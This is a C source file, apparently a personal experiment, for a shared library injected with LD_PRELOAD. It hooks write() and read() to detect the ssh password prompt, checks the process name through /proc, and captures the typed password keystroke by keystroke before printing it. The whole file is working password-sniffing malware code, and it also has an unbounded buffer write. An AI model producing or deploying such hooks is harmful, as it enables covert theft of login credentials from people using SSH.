#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdarg.h>


static int isAskingPasswd = 0;
// This is baaaaad
// extern char *program_invocation_name;
// extern char *program_invocation_short_name;

int checkifssh(int fd){
  int pid = getpid();
  // printf("pid is : %d\n", pid);
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/comm", pid);
  FILE *file = fopen(path, "r");
  char processName[64];
  fgets(processName, sizeof(processName), file);
  processName[strcspn(processName, "\n")] = 0;
  if (strcmp(processName, "ssh") == 0) {
    // printf("ITS SSH\n");
    return 1;
  }
  return 0;
  // printf("%s", processName);
}

// char *readpassphrase(const char *prompt, char *buf, size_t bufsiz, int flags){
//   char *(*r_readpassphrase)(const char *prompt, char *buf, size_t bufsiz, int flags) = dlsym(RTLD_NEXT, "readpassphrase");
//   char *output = r_readpassphrase(prompt, buf, bufsiz, flags);
//   if (!r_readpassphrase){
//     printf("Failed to find the real func");
//   }
//   printf("Hooked read passphrase prompt!\n");
//   return output;
// }

// int printf(const char *format, ...){
//   int (*r_printf)(const char *format, ...) = dlsym(RTLD_NEXT, "printf");
//   va_list args;
//   va_start(args, format);  
//   int output = vprintf(format, args);
//   printf("Result of printf\n");
//   return output;
//   }
  


ssize_t write(int fd, const void *buf, size_t nbyte) {
  ssize_t (*r_write)(int fd, const void *buf, size_t nbyte) = dlsym(RTLD_NEXT, "write");
  ssize_t output = r_write(fd, buf, nbyte);
  // But i dont know which fd is it!!!
  if (isatty(fd)) {
    if (strstr(buf, "'s password:")) {
      // r_write(1, "found it lol \n", nbyte);
      isAskingPasswd = 1;
    }
    // write(1, buf, nbyte);
    // printf("OUTPUT =>\n");
  }
  return output;
}

// To be sure that i got the password i need to get the string that was printed to the terminal.
// Problem, it is not write that i called, maybe printf ?
// Not printf either -_-
// Not the function readpassphrase either !!
// using lddebug i found out that it is read
// now i need to printit to be sure

ssize_t read(int fd, void *buf, size_t nbytes) {
  ssize_t (*r_read)(int fd, void *buf, size_t nbytes) = dlsym(RTLD_NEXT, "read");
  ssize_t output = r_read(fd, buf, nbytes);
  static char passwd[64];
  static int pos = 0;
  // Print le pwd mais tout le temps pas que pour le ssh (-_-)
  // printf("Call to read with fd => %d\n", fd);
  // if (fd == 3) {
  //   // char currentfd[64] ;
  //   // snprintf(currentfd, sizeof(currentfd),"Current fd for call to read is %d \n", fd );
  //   // write(1, currentfd, 64);
  //   // write(1, "\n", 1);
  //   write(1, buf, output);
  
  // }
  // char currentfd[64] ;
  // snprintf(currentfd, sizeof(currentfd),"Current fd for call to read is %d \n", fd );
  // write(1, currentfd, 64);
  // write(1, "\n", 1);
  int is_ssh = checkifssh(fd);
  if (isatty(fd) == 1 && is_ssh && isAskingPasswd == 1) {
    // tjrs sur [0] car keyboard lit key par key
    passwd[pos] = ((char *) buf)[0];
    if (((char*)buf)[0] == '\n') {
        // printf("Found the enter!\n");
        passwd[pos] = '\0';
        write(1, passwd, strlen(passwd));
        pos = 0;
        memset(passwd, 0, sizeof(passwd));
        isAskingPasswd = 0;
    }
    else {
      pos++;
    }
  }
    
  

  return output;
  }
